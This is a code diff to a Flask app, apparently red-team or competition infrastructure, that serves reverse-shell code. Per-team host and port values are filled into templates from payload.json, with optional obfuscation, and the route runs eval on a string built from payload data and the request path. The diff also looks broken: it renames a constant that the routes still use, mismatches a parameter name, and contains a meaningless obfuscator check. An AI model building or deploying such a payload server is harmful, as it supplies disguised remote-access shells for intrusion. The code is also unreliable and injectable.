@@ -3,15 +3,23 @@ from flask import Flask, request, Response
 
 app = Flask(__name__)
 
-DEFAULT_LANGUAGE = 'bash'
-DEFAULT_OBFUSCATE = False
+DEFAULT_LANG = 'bash'
+DEFAULT_RAW = True
+DEFAULT_OBFUSCATOR = 'default'
 
-@app.route('/', methods=['GET'], defaults={'team_id': None, 'language': None, 'return_raw': None})
-@app.route('/<team_id>', methods=['GET'], defaults={'language': None, 'return_raw': None})
-@app.route('/<team_id>/<language>', methods=['GET'], defaults={'return_raw': None})
-@app.route('/<team_id>/<language>/<return_raw>', methods=['GET'])
+@app.route('/', methods=['GET'], defaults={
+    'team_id': 'default',
+    'language': DEFAULT_LANGUAGE,
+    'obfuscator': None
+})
+@app.route('/<team_id>', methods=['GET'], defaults={
+    'language': DEFAULT_LANGUAGE,
+    'obfuscator': None
+})
+@app.route('/<team_id>/<language>', methods=['GET'], defaults={'obfuscator': None})
+@app.route('/<team_id>/<language>/<obfuscator>', methods=['GET'])
 
-def get_reverse_shell_code(team_id, language, return_raw):
+def get_reverse_shell_code(team_id, lang, obfuscator):
     with open('payload.json', 'r') as f:
         payload = json.loads(f.read())
 
@@ -23,12 +31,12 @@ def get_reverse_shell_code(team_id, language, return_raw):
     host = teams[team_id]['host']
     port = teams[team_id]['port']
 
-    if language not in payload:
-        language = DEFAULT_LANGUAGE
+    if lang not in payload:
+        lang = DEFAULT_LANG
 
-    code = payload[language]['raw'].format(HOST=host, PORT=port)
-    if not return_raw:
-        code = eval('obfuscator.' + payload[language][obfuscator])(code)
+    code = payload[lang]['raw'].format(HOST=host, PORT=port)
+    if obfuscator in payload[lang][obfuscator]:
+        code = eval('obfuscator.' + payload[lang][obfuscator])(code)
 
     return Response(code, mimetype='text/plain')
 
